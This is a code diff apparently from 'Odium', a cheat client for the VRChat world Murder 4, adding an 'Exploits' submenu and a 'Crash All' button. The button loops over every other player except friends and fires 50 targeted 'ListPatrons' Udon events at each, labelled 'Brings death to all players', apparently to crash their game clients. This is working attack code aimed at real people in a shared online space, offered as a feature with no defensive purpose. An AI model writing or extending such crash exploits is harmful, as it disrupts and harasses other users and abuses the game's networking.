@@ -2,6 +2,7 @@
 using Odium.ButtonAPI.QM;
 using Odium.Components;
 using Odium.GameCheats;
+using Odium.Odium;
 using Odium.Wrappers;
 using System;
 using System.Collections.Generic;
@@ -9,6 +10,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using UnityEngine;
+using VRC.SDKBase;
 
 namespace Odium.QMPages
 {
@@ -29,6 +31,20 @@ namespace Odium.QMPages
             QMNestedMenu playerActions = new QMNestedMenu(murder4NestedMenu, 2, 0, "<color=#8d142b>Player Actions</color>", "<color=#8d142b>Player Actions</color>", "Opens Select User menu", false, PeopleIcon, buttonImage);
             QMNestedMenu worldActions = new QMNestedMenu(murder4NestedMenu, 3, 0, "<color=#8d142b>World Actions</color>", "<color=#8d142b>World Actions</color>", "Opens Select User menu", false, WorldIcon, buttonImage);
             QMNestedMenu gunActions = new QMNestedMenu(murder4NestedMenu, 4, 0, "<color=#8d142b>Gun Actions</color>", "<color=#8d142b>Gun Actions</color>", "Opens Select User menu", false, GunIcon, buttonImage);
+            QMNestedMenu exploits = new QMNestedMenu(murder4NestedMenu, 2.5f, 1, "<color=#8d142b>Exploits</color>", "<color=#8d142b>Exploits</color>", "Opens Select User menu", false, SpriteUtil.LoadFromDisk(Environment.CurrentDirectory + "\\Odium\\ExploitIcon.png"), buttonImage);
+
+            new QMSingleButton(exploits, 2.5f, 1.5f, "Crash All", () =>
+            {
+                Patches.PhotonPatches.BlockUdon = true;
+                PlayerManager.prop_PlayerManager_0.field_Private_List_1_Player_0.ToArray().ToList().ForEach(player =>
+                {
+                    if (player.field_Private_APIUser_0.displayName == Networking.LocalPlayer.displayName) return;
+                    if (player.field_Private_APIUser_0.isFriend) return;
+                    for (int i = 0; i < 50; i++) Murder4Utils.SendTargetedPatreonUdonEvent(player, "ListPatrons");
+                });
+
+                Patches.PhotonPatches.BlockUdon = false;
+            }, "Brings death to all players", false, WinIcon, buttonImage);
 
             new QMSingleButton(winTriggers, 2, 2, "Murder", () =>
             {
